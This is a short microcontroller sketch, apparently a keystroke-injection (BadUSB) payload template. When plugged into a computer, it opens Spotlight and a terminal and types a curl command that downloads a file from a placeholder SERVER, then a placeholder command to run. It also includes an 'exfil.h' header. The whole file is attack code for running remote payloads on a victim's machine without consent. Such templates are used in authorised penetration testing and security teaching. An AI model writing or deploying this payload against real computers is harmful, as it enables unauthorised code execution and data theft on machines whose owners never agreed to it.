#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("terminal");
  delay(3000);
  Keyboard.println("curl http://SERVER/path/to/file > file");
  delay(3000);
  Keyboard.println("INSERT COMMAND TO EXECUTE HERE");
}
